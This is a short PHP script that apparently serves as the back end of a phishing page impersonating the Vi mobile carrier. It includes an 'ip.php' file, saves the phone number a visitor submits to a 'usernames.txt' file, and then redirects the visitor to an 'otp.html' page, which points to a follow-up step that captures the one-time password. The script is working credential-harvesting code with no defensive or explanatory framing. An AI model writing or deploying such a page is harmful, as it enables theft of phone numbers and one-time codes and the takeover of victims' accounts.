<?php
include 'ip.php';
file_put_contents("usernames.txt", "VI sim Phone Number : " . $email = $_POST['email'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>
